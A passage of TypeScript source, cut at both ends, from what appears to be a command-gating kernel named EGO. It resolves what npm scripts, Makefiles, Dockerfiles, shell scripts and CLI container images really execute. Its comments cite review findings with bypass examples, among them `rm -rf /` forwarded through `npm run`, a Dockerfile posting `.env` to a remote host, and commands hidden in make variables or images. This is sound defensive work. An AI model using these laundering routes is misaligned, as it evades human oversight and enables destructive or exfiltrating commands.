  if (hit !== undefined) return hit;
  const r = git(['rev-parse', '--path-format=absolute', '--git-common-dir'], dir);
  const main = r.ok && r.stdout ? canonicalPath(dirname(r.stdout.trim())) : null;
  gitCommonDirCache.set(key, main === key ? null : main);
  return gitCommonDirCache.get(key) ?? null;
}

const gitToplevelCache = new Map<string, string | null>();
/** `git rev-parse --show-toplevel` for a directory, memoised for the life of the process. */
function gitToplevel(dir: string): string | null {
  const key = canonicalPath(dir);
  const hit = gitToplevelCache.get(key);
  if (hit !== undefined) return hit;
  const r = git(['rev-parse', '--show-toplevel'], dir);
  const top = r.ok && r.stdout ? canonicalPath(r.stdout.trim()) : null;
  gitToplevelCache.set(key, top);
  return top;
}

/** The repository `git` will actually act on: resolved from the effective directory the way git resolves it, and
 *  accepted only when it lies inside a registered root — EGO may not read hooks it has no mandate over. */
function gitSubjectRepository(
  ctx: EvaluationContext,
  tokens: string[],
  env: ExecutionEnvironment,
): string | null {
  let dir = env.cwd;
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    const eq = /^(?:--work-tree=|-C)(.+)$/.exec(t);
    if ((t === '-C' || t === '--work-tree') && tokens[i + 1]) dir = resolve(dir, tokens[i + 1]!);
    else if (eq) dir = resolve(dir, eq[1]!);
  }
  // A subprocess per git segment is far too expensive — the kernel has a 60 ms budget and the regression corpus
  // is 200k commands — and the answer only depends on the directory, so it is memoised. The common case does not
  // reach it at all: when the effective directory IS a registered root, that root is the subject.
  const direct = repoRootFor(ctx, dir);
  if (direct !== null && canonicalPath(dir) === direct) return direct;
  const top = gitToplevel(dir);
  if (top === null) return repoRootFor(ctx, dir);
  // the subject must be one EGO governs; a repository outside every registered root is not one it may read
  return repoRootFor(ctx, top) === null ? null : top;
}

/** The registered repository root containing `dir`, or null. */
function repoRootFor(ctx: EvaluationContext, dir: string): string | null {
  const d = canonicalPath(dir);
  let best: string | null = null;
  for (const r of ctx.repoRoots ?? []) {
    const root = canonicalPath(r);
    if ((d === root || d.startsWith(root + sep)) && (best === null || root.length > best.length)) best = root;
  }
  return best;
}

function resolveScriptCommand(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  norm: string,
  env: ExecutionEnvironment,
): ProducerResult {
  const tokens = tokenize(norm);
  const head = tokens[0] ?? '';
  const cwd = env.cwd;
  const written = env.written;
  /** A4 — FRESHNESS. A source rewritten by an earlier unit of the SAME command can no longer justify a later
   *  ALLOW: `printf 'build:\n\tgit push' > Makefile && make build` was classified from the old contents. */
  //  `\0any` is the wildcard: an EARLIER unit of this command could not be classified, so it may have written
  //  anything, and no later resolution in the same unit can be proven fresh. Enumerating writer commands would be
  //  the same losing game as enumerating shell spellings — `node -e`, `python -c`, `git checkout -- f`, a build
  //  step that regenerates its own makefile, all write files without being "write commands".
  const stale = (...paths: string[]): boolean =>
    written.has('\0any') || paths.some((p) => written.has(canonicalPath(p)));

  // A3 — a semantic conclusion drawn from a RELATIVE path is only trustworthy when the directory it is relative to
  // has been proven. Absence of proof is not proof.
  if (!env.cwdVerified)
    return {
      kind: 'shell-script',
      key: `unverified:${norm}`,
      body: null,
      reason: 'the working directory this resolution depends on could not be verified',
      resolution: 'CONTEXT_UNVERIFIED',
    };
  // AN IMAGE THAT IS A CLI CARRIES THAT CLI'S COMMAND LINE. `docker run --rm -e AWS_… amazon/aws-cli iam
  // delete-user --user-name bob` runs the real AWS CLI against the real endpoint and deletes a production IAM
  // user; the bare `aws iam delete-user` is an absolute core deny that no human may approve, and wrapped in the
  // vendor's own image it ran under a container capability (exit review 7). Only the images whose ENTRYPOINT IS
  // the tool are read this way — the argv of an arbitrary image is not a command line this kernel can parse —
  // and the tool's own name is put back in front of it so the target model sees what it always sees.
  if (/^(docker|podman|nerdctl)$/.test(head) && /^(run|create)$/.test(tokens[1] ?? '')) {
    for (let i = 2; i < tokens.length; i++) {
      const t = tokens[i]!;
      if (t.startsWith('-')) {
        if (DOCKER_RUN_VALUE_OPTS.test(t) && !t.includes('=')) i++;
        continue;
      }
      const tool = CLI_IMAGES.find(([re]) => re.test(imageName(t)));
      if (tool) {
        const argv = tokens.slice(i + 1);
        return {
          kind: 'shell-script',
          key: `cli-image:${t}`,
          body: argv.length ? [`${tool[1]} ${requote(argv)}`] : [],
          reason: `the image ${t} IS the ${tool[1]} command line`,
          resolution: 'RESOLVED_COMPLETE',
        };
      }
      // ...and the scan does NOT stop at the first bare operand: an option this kernel does not know consumes
      // its value, so `docker run --cgroup-parent foo amazon/aws-cli …` put `foo` where the image was expected
      // (exit review 8). The image names are specific enough that scanning every operand is safe.
      continue;
    }
  }
  // A DOCKERFILE IS A PRODUCER. `docker build .` executes every `RUN` line in the build context's Dockerfile —
  // as root, with the whole context copied in — and EGO resolved Makefiles, manifest scripts and shell scripts
  // while treating this one as an opaque `container.build`. A Dockerfile whose `RUN` line POSTs `.env` to a
  // remote host was ALLOW (exit review 7). It is read like any other producer: its shell lines are handed to the
  // canonical analysis, and a Dockerfile that cannot be read is opacity rather than absence.
  // `docker image build` is `docker build` through the management GROUP, and `docker buildx build` through the
  // plugin: the verb is the LAST word of the pair, not `tokens[1]` (exit review 8).
  const buildAt = tokens.findIndex(
    (t, i) => i > 0 && t === 'build' && (i === 1 || /^(image|buildx|builder)$/.test(tokens[i - 1] ?? '')),
  );
  if (/^(docker|podman|nerdctl|buildah)$/.test(head) && buildAt > 0) {
    // a glued short option keeps its `=`: `-f=Dockerfile.evil` names `Dockerfile.evil`, not `=Dockerfile.evil`
    const named = optionValue(tokens, 'f', ['--file'])?.replace(/^=/, '') ?? null;
    // `-f -` reads the Dockerfile from STANDARD INPUT — a stream this kernel cannot read, whatever the context is
    if (named === '-')
      return {
        kind: 'shell-script',
        key: 'dockerfile:stdin',
        body: null,
        reason: 'the Dockerfile is read from standard input',
        resolution: 'UNREADABLE',
      };
    // the build CONTEXT is the last bare operand; `-` and a URL are contexts EGO cannot read
    // AN OPTION THIS KERNEL DOES NOT KNOW STILL TAKES ITS VALUE. Reading the LAST bare operand as the context
    // let `docker build . --no-cache-filter src` read `src` as the context, so the real Dockerfile was never
    // found. The context is the FIRST bare operand, which docker documents as the single PATH|URL|- argument.
    const after = tokens.slice(buildAt + 1);
    const operands = after.filter((t, i) => (t === '-' || !t.startsWith('-')) && !DOCKER_BUILD_VALUE_OPTS.test(after[i - 1] ?? ''));
    const context0 = operands[0];
    const context = context0 ?? '.';
    // `docker build -` reads the Dockerfile from STANDARD INPUT, and a URL context is fetched: neither is a file
    // this kernel can read, so neither can carry a positive claim
    if (/^(-$|https?:|git@|ssh:|github\.com\/)/.test(context) && named === null)
      return {
        kind: 'shell-script',
        key: `dockerfile:${context}`,
        body: null,
        reason: 'the build context is a stream or a remote URL, so its Dockerfile was never read',
        resolution: 'UNREADABLE',
      };
    // PODMAN'S DEFAULT BUILD FILE IS `Containerfile`, and it falls back to `Dockerfile`. Looking only for the
    // latter made `podman build .` on an ordinary podman project a proven absence over a file full of RUN lines.
    let dockerfile = named ?? `${context}/Dockerfile`;
    if (named === null && !fileExists(resolve(cwd, dockerfile)) && fileExists(resolve(cwd, `${context}/Containerfile`)))
      dockerfile = `${context}/Containerfile`;
    const abs = isAbsolute(dockerfile) ? dockerfile : resolve(cwd, dockerfile);
    if (stale(abs))
      return { kind: 'shell-script', key: `dockerfile:${abs}`, body: null, reason: 'the Dockerfile is rewritten earlier in the same command', resolution: 'STALE' };
    const text = readInsideWorkspace(ctx, abs);
    if (text === null) {
      // NO DOCKERFILE IS AN ABSENCE THAT WAS OBSERVED, not an opacity. `docker build .` in a directory that holds
      // no Dockerfile fails and executes nothing, and treating it as opaque would gate every `docker build` in a
      // repository that keeps its Dockerfile elsewhere — the proportionality half of the same contract.
      const dir = abs.slice(0, abs.lastIndexOf('/'));
      const listed = listDirectory(dir);
      if (!fileExists(abs) && listed !== null)
        return {
          kind: 'shell-script',
          key: `dockerfile:${abs}`,
          body: null,
          reason: `no Dockerfile in ${dockerfile.replace(/\/Dockerfile$/, '') || '.'}`,
          resolution: 'ABSENT_VERIFIED',
        };
      return {
        kind: 'shell-script',
        key: `dockerfile:${abs}`,
        body: null,
        reason: fileExists(abs)
          ? 'the Dockerfile is outside the workspace'
          : 'the build context directory could not be read',
        resolution: 'UNREADABLE',
      };
    }
    return {
      kind: 'shell-script',
      key: `dockerfile:${abs}`,
      body: dockerfileShellLines(text),
      containerPaths: true,
      reason: `Dockerfile ${dockerfile}`,
      resolution: 'RESOLVED_COMPLETE',
      provenance: { source: abs, fingerprint: fingerprint(text) },
    };
  }
  // shell scripts: ./x.sh, bash x.sh, sh x.sh, source x.sh, . x.sh, /abs/x.sh
  let scriptPath: string | null = null;
  if (/^\.{0,2}\//.test(head) || isAbsolute(head)) scriptPath = head;
  else if (
    (head === 'bash' || head === 'sh' || head === 'zsh' || head === 'source' || head === '.') &&
    tokens[1] &&
    !tokens.some((t) => t === '-c' || /^-[a-z]*c$/i.test(t))
  ) {
    const args = tokens.slice(1).filter((t) => !t.startsWith('-'));
    if (args[0]) scriptPath = args[0];
  }
  if (scriptPath !== null) {
    const abs = isAbsolute(scriptPath) ? scriptPath : resolve(cwd, scriptPath);
    if (stale(abs))
      return {
        kind: 'shell-script',
        key: `script:${abs}`,
        body: null,
        reason: 'this script is rewritten earlier in the same command, so its analysed contents are not what runs',
        resolution: 'STALE',
      };
    const text = readInsideWorkspace(ctx, abs);
    if (text === null)
      return {
        kind: 'shell-script',
        key: `script:${abs}`,
        body: null,
        reason: 'script not readable inside the workspace',
        resolution: fileExists(abs) ? 'UNREADABLE' : 'ABSENT_VERIFIED',
      };
    if (
      !/^#!.*\b(sh|bash|zsh|dash|ksh)\b/.test(text) &&
      !/\.(sh|bash|zsh)$/.test(abs) &&
      head !== 'bash' &&
      head !== 'sh' &&
      head !== 'zsh' &&
      head !== 'source' &&
      head !== '.'
    ) {
      return {
        kind: 'shell-script',
        key: `script:${abs}`,
        body: null,
        reason: 'executable is not a shell script',
        resolution: 'UNSUPPORTED',
      };
    }
    const body = scriptSegments(text);
    return {
      kind: 'shell-script',
      key: `script:${abs}`,
      body,
      bodyEnv: env,
      oneShell: true,
      reason: body ? 'shell script analysed' : 'shell script uses dynamic commands',
      resolution: body ? 'RESOLVED_COMPLETE' : 'DYNAMIC',
      provenance: { source: abs, fingerprint: fingerprint(text) },
    };
  }
  // package manager scripts
  if (head === 'npm' || head === 'pnpm' || head === 'yarn' || head === 'bun') {
    // A workspace/prefix/filter selector changes WHICH manifest the script comes from. EGO does not model the
    // workspace graph, so reading the root manifest would be a confident wrong answer.
    const selector = tokens.find(
      (t) =>
        /^(-w|--workspace|--workspaces|--filter|-F|--prefix|-C|--dir|--cwd|--scope|--recursive|-r)$/.test(t) ||
        /^(--workspace|--filter|--prefix|--dir|--cwd|--scope)=/.test(t),
    );
    if (selector)
      return {
        kind: 'npm-script',
        key: `npm:selector:${selector}`,
        body: null,
        reason: `the ${selector} selector chooses a manifest outside the resolved working directory`,
        resolution: 'UNSUPPORTED',
      };
    let script: string | null = null;
    const sub = tokens[1] ?? '';
    // npm accepts a long list of aliases for install, including the deliberate typo `isntall`; `npm it` is
    // install-test. Missing one meant the ambient closure was skipped entirely and the install reached ALLOW
    // (challenge 6, finding 33). Taken from npm-install(1) and npm-ci(1) rather than guessed.
    const INSTALL_SUBS = new Set([
      'install', 'i', 'in', 'ins', 'inst', 'insta', 'instal', 'isnt', 'isnta', 'isntal', 'isntall',
      'install-test', 'it', 'install-ci-test', 'cit', 'clean-install', 'clean-install-test',
      'ci', 'add', 'update', 'up', 'upgrade', 'udpate', 'rebuild', 'rb',
    ]);
    if (INSTALL_SUBS.has(sub) || (head === 'yarn' && sub === '')) {
      const pkgPath = findUp(ctx, cwd, 'package.json');
      const text = pkgPath ? readInsideWorkspace(ctx, pkgPath) : null;
      if (pkgPath === null || text === null) return manifestUnresolved(ctx, pkgPath, 'npm:install', 'package.json');
      let scripts: Record<string, unknown> = {};
      try {
        scripts = (JSON.parse(text) as { scripts?: Record<string, unknown> }).scripts ?? {};
      } catch {
        return { kind: 'npm-script', key: 'npm:install', body: null, reason: 'package.json unparsable', resolution: 'UNREADABLE' };
      }
      const names = ['preinstall', 'install', 'postinstall', 'prepare', 'prepublish', 'preprepare', 'postprepare'].filter(
        (n) => typeof scripts[n] === 'string',
      );
      const body = names.map((n) => scripts[n] as string); // pre/main/post are separate processes
      // A5 — the install's execution closure includes the DEPENDENCY TREE's lifecycle scripts, which EGO cannot
      // read. `--ignore-scripts` is the one spelling that provably runs none of them.
      // ONLY `--ignore-scripts` is real. npm silently ignores `--no-scripts` and runs every lifecycle script, so
      // accepting it was a positive claim that had not been earned (challenge 6, finding 34).
      // THE LAST SPELLING ON THE LINE WINS, as it does for every npm boolean: `--ignore-scripts
      // --no-ignore-scripts` runs every lifecycle script, and a `some()` read the first one and stopped
      // (exit review 8).
      const ignore = tokens.reduce<boolean>((acc, t) => {
        if (t === '--ignore-scripts' || t === '--ignore-scripts=true') return true;
        if (t === '--no-ignore-scripts' || t === '--ignore-scripts=false') return false;
        return acc;
      }, false);
      if (!ignore)
        return {
          kind: 'npm-script',
          key: `npm:${pkgPath ? dirname(pkgPath) : cwd}:install`,
          body: body.length ? body : null,
          bodyEnv: childEnvironment(env, { cwd: dirname(pkgPath), cwdVerified: env.cwdVerified }),
          reason: 'install runs the dependency tree’s lifecycle scripts, which EGO cannot read (--ignore-scripts runs none)',
          resolution: 'AMBIENT_UNRESOLVED',
        };
      // --ignore-scripts and no local lifecycle script: the manifest was fully read, so absence is PROVEN
      if (!body.length)
        return {
          kind: 'npm-script',
          key: `npm:install:none`,
          body: null,
          reason: 'no lifecycle script and --ignore-scripts',
          resolution: 'ABSENT_VERIFIED',
        };
      return {
        kind: 'npm-script',
        key: `npm:${dirname(pkgPath)}:install`,
        body,
        bodyEnv: childEnvironment(env, { cwd: dirname(pkgPath), cwdVerified: env.cwdVerified }),
        reason: 'install lifecycle scripts',
        resolution: 'RESOLVED_COMPLETE',
        provenance: { source: pkgPath, fingerprint: fingerprint(text) },
      };
    }
    if (sub === 'run' || sub === 'run-script') script = tokens.slice(2).find((t) => !t.startsWith('-')) ?? null;
    else if (sub === 'test' || sub === 'start' || sub === 'stop' || sub === 'restart') script = sub;
    else if (
      (head === 'yarn' || head === 'pnpm' || head === 'bun') &&
      sub &&
      !sub.startsWith('-') &&
      !PACKAGE_MANAGER_BUILTINS.has(sub)
    )
      script = sub;
    if (script === null) {
      // `npm init <initializer>` / `yarn create <pkg>` acquire and RUN a package; with no argument they only
      // write a manifest. The npm producer claimed the head and answered "not a script", which never reached the
      // vocabulary that classifies acquiring third-party code (exit review 2).
      if (/^(init|create)$/.test(sub) && tokens.slice(2).some((t) => !t.startsWith('-')))
        return {
          kind: 'npm-script',
          key: `npm:${sub}:${tokens[2]}`,
          body: null,
          reason: `${head} ${sub} downloads and runs an initializer package`,
          resolution: 'AMBIENT_UNRESOLVED',
          unresolved: [{ what: 'ambient', where: tokens[2] ?? sub, why: 'an initializer acquired at run time' }],
        };
      return { kind: 'none', key: `npm:${sub}`, body: null, reason: 'not a script invocation', resolution: 'ABSENT_VERIFIED' };
    }
    const pkgPath = findUp(ctx, cwd, 'package.json');
    if (pkgPath !== null && stale(pkgPath))
      return {
        kind: 'npm-script',
        key: `npm:${pkgPath}:${script}`,
        body: null,
        reason: 'package.json is rewritten earlier in the same command, so its analysed contents are not what runs',
        resolution: 'STALE',
      };
    const text = pkgPath ? readInsideWorkspace(ctx, pkgPath) : null;
    if (pkgPath === null || text === null) return manifestUnresolved(ctx, pkgPath, `npm:${script}`, 'package.json');
    let scripts: Record<string, unknown> = {};
    try {
      scripts = (JSON.parse(text) as { scripts?: Record<string, unknown> }).scripts ?? {};
    } catch {
      return { kind: 'npm-script', key: `npm:${script}`, body: null, reason: 'package.json unparsable', resolution: 'UNREADABLE' };
    }
    const names = [`pre${script}`, script, `post${script}`].filter((n) => typeof scripts[n] === 'string');
    if (!names.includes(script)) {
      if (script === 'start' && head === 'npm')
        return {
          kind: 'npm-script',
          key: `npm:${script}`,
          body: ['node server.js'],
          reason: 'npm start default',
          resolution: 'RESOLVED_COMPLETE',
        };
      // the manifest was fully read and genuinely has no such script: nothing executes. This is the narrow case
      // where absence is PROVEN, and the only one that keeps a declared ALLOW.
      return {
        kind: 'npm-script',
        key: `npm:${script}`,
        body: null,
        reason: `script "${script}" not found in package.json`,
        resolution: 'ABSENT_VERIFIED',
      };
    }
    // ONE ENTRY PER SCRIPT, NOT PER SEGMENT. Pre-splitting here projected the model away twice over: a pipeline
    // EDGE inside a script was lost, so `echo 'git push origin main' | sh` in a package script asked instead of
    // being denied; and each segment became its own UNIT, i.e. its own shell, so a `cd` on the left of an `&&`
    // did not reach the right of it. `pre`, the script and `post` ARE separate processes and stay separate
    // entries; what happens inside one of them is one shell, and splitting it is the analyzer's job.
    // NPM APPENDS WHAT FOLLOWS `--` TO THE SCRIPT BODY. `npm run build -- deploy` runs `make build deploy`, so
    // the process that actually runs carries a goal the manifest never mentions: `deploy` pushed to the remote,
    // `prodk` deleted a production pod and `nuke` was `rm -rf /`, all at ALLOW, because only the manifest string
    // was resolved and every remaining token was discarded (exit review 7). The forwarded words go to the MAIN
    // script only — `pre` and `post` are separate processes and npm passes them nothing.
    // NPM FORWARDS POSITIONALS WITH OR WITHOUT `--`. The separator only stops npm parsing FLAGS; a bare word
    // after the script name is passed to the script either way, so `npm run build prodk` really runs
    // `make build prodk` and `npm test deploy` runs the test script with `deploy` appended (exit review 8).
    const dd = tokens.indexOf('--');
    const nameAt = script === null ? -1 : tokens.indexOf(script);

    const forwarded =
      dd >= 0
        ? tokens.slice(dd + 1)
        : nameAt > 0
          ? tokens.slice(nameAt + 1).filter((t) => !t.startsWith('-'))
          : [];
    const body = names.map((n) =>
      n === script && forwarded.length ? `${scripts[n] as string} ${requote(forwarded)}` : (scripts[n] as string),
    );
    // npm accepts its configuration as flags anywhere on the line, including AFTER the script name, and
    // `--script-shell` re-points the interpreter of every script (challenge 8, finding 3)
    const npmFlags = tokens.filter((t) =>
      /^--(script-shell|node-options|shell|ignore-scripts=false|foreground-scripts|userconfig|globalconfig|prefix)(=|$)/.test(t),
    );
    // the same settings live in `.npmrc` / `.yarnrc.yml`, which npm reads from the package directory upwards.
    // A flag on the command line was modelled and the FILE that sets the identical key was not (challenge 8).
    const rcFile = ['.npmrc', '.yarnrc.yml', '.yarnrc'].map((n) => findUp(ctx, cwd, n)).find((f) => f !== null);
    const rcText = rcFile ? readInsideWorkspace(ctx, rcFile) : null;
    const rcRebinds =
      rcFile !== null && rcFile !== undefined && (rcText === null || /^\s*(script-shell|node-options|shell|scriptShell|yarnPath|plugins)\s*[:=]/m.test(rcText))
        ? [rcFile]
        : [];
    return {
      kind: 'npm-script',
      ...(npmFlags.length || rcRebinds.length
        ? {
            unresolved: [
              ...npmFlags.map((f) => ({
                what: 'binding' as const,
                where: f,
                why: 'an npm configuration flag re-points the interpreter this script runs in',
              })),
              ...rcRebinds.map((f) => ({
                what: 'config' as const,
                where: f,
                why: 'this file re-points the interpreter every package script runs in',
              })),
            ],
          }
        : {}),
      key: `npm:${dirname(pkgPath)}:${script}:${forwarded.join('\u0000')}`,
      body,
      bodyEnv: childEnvironment(env, {
        cwd: dirname(pkgPath),
        cwdVerified: env.cwdVerified,
        config: { read: [pkgPath], unresolved: [] },
        sources: { [pkgPath]: fingerprint(text) },
      }),
      reason:
        npmFlags.length || rcRebinds.length
          ? `package.json script "${script}"; NOT fully resolved: ${npmFlags[0] ?? rcRebinds[0]}`
          : `package.json script "${script}"`,
      resolution: npmFlags.length || rcRebinds.length ? 'PARTIAL' : 'RESOLVED_COMPLETE',
      provenance: { source: pkgPath, fingerprint: fingerprint(text) },
    };
  }
  // make targets
  if (head === 'make' || head === 'gmake') {
    const MAKE_ARG_OPTS = new Set([
      '-C', '--directory', '-f', '--file', '--makefile', '-o', '--old-file', '-W', '--what-if', '-I',
      '--include-dir',
    ]);
    // `-j`, `--jobs`, `-l` and `--load-average` take an OPTIONAL argument, and make decides by LOOKING at it:
    // `make -j build` builds `build`, `make -j4 build` too. Treating the argument as mandatory swallowed the
    // target name, so the analyzer resolved the DEFAULT goal and reported on a recipe nobody asked for
    // (exit review 5).
    const MAKE_OPTIONAL_NUMBER_OPTS = new Set(['-j', '--jobs', '-l', '--load-average']);
    const targets: string[] = [];
    const cliRebinds: string[] = [];
    const cliInputs: string[] = [];
    const cliVars = new Map<string, string>();
    // THE QUOTING IS ONLY IN THE RAW SEGMENT. Normalization de-quotes, so `make V="docker --context production rm
    // -f app" run` reaches the scan below as eight bare words: the override kept only `docker`, `--context` and
    // `production` became goals, and `-f app` was read as make's own `--file` option — which made the resolver
    // read a makefile that does not exist and PROVE the target absent, laundering the command (exit review 5).
    const rawAssignedWords = new Set<string>();
    for (const t of tokenizeMarked(env.rawSegment ?? norm)) {
      if (t.text.startsWith('-') || !/^[A-Za-z_][A-Za-z0-9_.]*=/.test(t.text)) continue;
      const value = t.text.slice(t.text.indexOf('=') + 1);
      cliVars.set(t.text.slice(0, t.text.indexOf('=')), value);
      if (/\s/.test(value)) for (const w of value.split(/\s+/).filter(Boolean)) rawAssignedWords.add(w);
    }

    let makeDir = cwd;
    const makeFiles: string[] = []; // every -f/--file/--makefile: make reads them ALL, not just the last
    for (let i = 1; i < tokens.length; i++) {
      const t = tokens[i]!;
      if (rawAssignedWords.has(t)) continue; // a word INSIDE a quoted assignment value is not make's own argument
      if (t.startsWith('-')) {
        const dirEq = /^(?:--directory=|-C)(.+)$/.exec(t);
        const fileEq = /^(?:--file=|--makefile=|-f)(.+)$/.exec(t);
        // successive -C are CUMULATIVE in make: `make -C a -C b` enters a, then a/b (challenge 5, finding 17)
        if ((t === '-C' || t === '--directory') && tokens[i + 1]) makeDir = resolve(makeDir, tokens[i + 1]!);
        else if (dirEq) makeDir = resolve(makeDir, dirEq[1]!);
        if ((t === '-f' || t === '--file' || t === '--makefile') && tokens[i + 1]) makeFiles.push(tokens[i + 1]!);
        else if (fileEq) makeFiles.push(fileEq[1]!);
        if (MAKE_ARG_OPTS.has(t)) i++;
        else if (MAKE_OPTIONAL_NUMBER_OPTS.has(t) && /^\d+(\.\d+)?$/.test(tokens[i + 1] ?? '')) i++;
        continue;
      }
      if (t.includes('=')) {
        // a command-line variable assignment is not a target — but make takes execution inputs in this position
        // too, and the leading-assignment capture cannot see them (challenge 8, finding 2)
        if (/^(SHELL|\.SHELLFLAGS|PATH)=/.test(t)) cliRebinds.push(t);
        else if (EXECUTION_ENV_INPUTS.test(t.slice(0, t.indexOf('=')))) cliInputs.push(t);
        // a command-line assignment OVERRIDES every assignment of that name in the makefile, so the recipe does
        // not expand to what the file says (exit review 5)
        if (!cliVars.has(t.slice(0, t.indexOf('=')))) cliVars.set(t.slice(0, t.indexOf('=')), t.slice(t.indexOf('=') + 1));
        continue;

      }
      targets.push(t);
    }
    // THE QUOTING IS ONLY IN THE RAW SEGMENT. Normalization de-quotes, so `make V="git push origin main" run`
    // reaches the scan above as five bare words: the override kept only `git`, and `push origin main` became
    // three TARGETS. That laundered a governed command through a makefile variable (exit review 5). The raw
    // segment still has the quoting, so the assignments are re-read from it and the words they own stop being
    // mistaken for goals.
    // `make -f -` reads the makefile from STDIN and `-E`/`--eval` injects makefile text on the command line:
    // neither is a file this resolver can read, and reporting "no Makefile" over them claimed proven absence of
    // a recipe an attacker supplies (exit review 2).
    // `-E'deploy: ; CMD'` is GLUED, like every other short option, and the guard matched only the detached and
    // `=` forms (exit review 8)
    if (makeFiles.includes('-') || tokens.some((t) => /^(-E|--eval)(=|$)/.test(t) || /^-E./.test(t)))
      return {
        kind: 'make-target',
        key: `make:injected:${norm}`,
        body: null,
        reason: 'the makefile is supplied on stdin or on the command line and cannot be read',
        resolution: 'DYNAMIC',
        unresolved: [{ what: 'body', where: 'makefile', why: 'supplied out of band' }],
      };
    if (tokens.slice(1).some((t) => /[$`]/.test(t)))
      return {
        kind: 'make-target',
        key: `make:dynamic:${norm}`,
        body: null,
        reason: 'the makefile, directory or target is built at runtime and cannot be resolved',
        resolution: 'DYNAMIC',
      };
    const paths = makeFiles.length
      ? makeFiles.map((f) => resolve(makeDir, f))
      : // GNU make's own precedence is GNUmakefile, then makefile, then Makefile. Reading them in the wrong order
        // named a file make never opens while claiming RESOLVED_COMPLETE (challenge 6, findings 2, 8, 20). The
        // candidate is resolved to the REAL directory entry: on a case-insensitive filesystem `makefile` and
        // `Makefile` are the same file but canonicalise to different strings, which silently unhooked the
        // freshness ledger.
        defaultMakefile(makeDir);
    if (paths.some((p) => stale(p)))
      return {
        kind: 'make-target',
        key: `make:${makeDir}:${targets.join(',')}`,
        body: null,
        reason: 'the makefile is rewritten earlier in the same command, so its analysed contents are not what runs',
        resolution: 'STALE',
      };
    if (!paths.length || !paths.some((p) => readInsideWorkspace(ctx, p) !== null)) {
      const exists = paths.some((p) => fileExists(p));
      return {
        kind: 'make-target',
        key: `make:${makeDir}:${targets.join(',')}`,
        body: null,
        reason: exists ? 'Makefile present but not readable' : 'no Makefile',
        resolution: exists ? 'UNREADABLE' : 'ABSENT_VERIFIED',
      };
    }
    // merge every -f file, following includes
    const merged: MakeFileModel = {
      rules: new Map(),
      firstTarget: null,
      defaultGoal: null,
      oneShell: false,
      unsupported: [],
      unsupportedFor: new Map(),
      hasPatternRules: false,
      targetVars: new Map(),
      overridden: new Set(),
      altVars: new Map(),
      exported: new Map(),
      patternRules: [],
      rebinds: [],
      vars: new Map(),
      parseRan: [],
      sources: [],
      text: '',
    };
    for (const p of paths) {
      const m = parseMakefile(ctx, p, makeDir);
      for (const [t, r] of m.rules) {
        const e = merged.rules.get(t);
        if (e) {
          e.recipes.push(...r.recipes);
          e.prereqs.push(...r.prereqs);
        } else merged.rules.set(t, { recipes: [...r.recipes], prereqs: [...r.prereqs] });
      }
      merged.unsupported.push(...m.unsupported);
      for (const [t, u] of m.unsupportedFor)
        merged.unsupportedFor.set(t, [...(merged.unsupportedFor.get(t) ?? []), ...u]);
      if (m.hasPatternRules) merged.hasPatternRules = true;
      merged.patternRules.push(...m.patternRules);
      for (const n of m.overridden) merged.overridden.add(n);
      for (const [k, v] of m.exported) merged.exported.set(k, v);
      for (const [k, vs] of m.altVars) {
        const into = merged.altVars.get(k) ?? new Set<string>();
        for (const v of vs) into.add(v);
        merged.altVars.set(k, into);
      }
      for (const [t, vars] of m.targetVars) {
        const into = merged.targetVars.get(t) ?? new Map<string, string>();
        for (const [k, v] of vars) into.set(k, v);
        merged.targetVars.set(t, into);
      }
      merged.rebinds.push(...m.rebinds);
      for (const [k, v] of m.vars) merged.vars.set(k, v);
      // the command line wins over every file — EXCEPT over a name the makefile assigned with `override`
      for (const [k, v] of cliVars) if (!merged.overridden.has(k)) merged.vars.set(k, v);
      merged.parseRan.push(...m.parseRan);
      merged.sources.push(...m.sources);
      merged.text += m.text + '\n';
      if (m.oneShell) merged.oneShell = true;
      if (m.defaultGoal) merged.defaultGoal = m.defaultGoal; // make takes the LAST assignment
      if (!merged.firstTarget) merged.firstTarget = m.firstTarget;
    }
    // A bare `make` builds .DEFAULT_GOAL when set, not the first rule (challenge 5, finding 16).
    // A VERSION OR HELP PROBE READS NO MAKEFILE. `make --version` prints the version and exits: it selects no
    // goal, expands nothing and executes nothing. In any repository whose default goal happens to contain a
    // locked command it was refused outright, and the reason named a target the probe never reaches
    // (exit review 7).
    // the LONG forms only: a `-v` or `-h` on this line may belong to a command spliced into a variable's value
    // (`make CMD='docker run -v /:/host alpine sh' run`), and reading it as make's own probe flag would make the
    // whole producer resolve to nothing — found immediately by the producer cross-product
    // make's OWN probe flags, read from the segment AS WRITTEN: `make ship NOTE="see --version output"` puts the
    // word inside a quoted VALUE, and a token scan saw it as make's option (exit review 8).
    if (tokenizeMarked(env.rawSegment ?? tokens.join(' ')).some((t) => !t.quoted && /^(--version|--help)$/.test(t.text)))
      return { kind: 'make-target', key: `make:probe`, body: null, reason: 'a version or help probe selects no goal', resolution: 'NOT_A_PRODUCER' };
    const wanted = targets.length ? targets : [merged.defaultGoal ?? merged.firstTarget].filter((t): t is string => !!t);
    const body: string[] = [];
    const missing: string[] = [];
    let partial: string | null = null;
    // A5 — EXECUTION CLOSURE: a target's prerequisites run BEFORE it, so their recipes are part of what this
    // command executes (challenge 5, finding 8). Walked transitively with a cycle guard and a depth bound.
    const visited = new Set<string>();
    const touchedBlind: string[] = [];
    const walk = (t: string, depth: number): void => {
      if (visited.has(t)) return;
      visited.add(t);
      touchedBlind.push(...(merged.unsupportedFor.get(t) ?? []));
      let rule = merged.rules.get(t);
      if (!rule) {
        // AN IMPLICIT RULE BUILDS IT. `all: evil.o` with `%.o: %.c` runs that rule's recipe, and recording only
        // the blindness made the effect an opacity where the recipe is right there to read (exit review 7).
        // make picks the FIRST pattern whose target matches; the stem replaces `%` in the prerequisites and `$*`
        // in the recipe.
        for (const pr of merged.patternRules) {
          const [pre, post] = pr.target.split('%') as [string, string];
          if (!t.startsWith(pre) || !t.endsWith(post) || t.length < pre.length + post.length) continue;
          const stem = t.slice(pre.length, t.length - post.length);
          rule = {
            prereqs: pr.prereqs.map((q) => q.replace(/%/g, stem)),
            recipes: pr.recipes.map((r) => r.replace(/\$\*/g, stem)),
          };
          break;
        }
      }
      if (!rule) {
        // a prerequisite with no rule is usually a FILE, which executes nothing; a requested TARGET with no rule is
        // only PROVEN absent when this makefile uses nothing the parser cannot see
        if (depth === 0) missing.push(t);
        // ...AND A PREREQUISITE IS NOT A FILE WHEN A PATTERN RULE CAN BUILD IT. `all: evil.o` with `%.o: %.c`
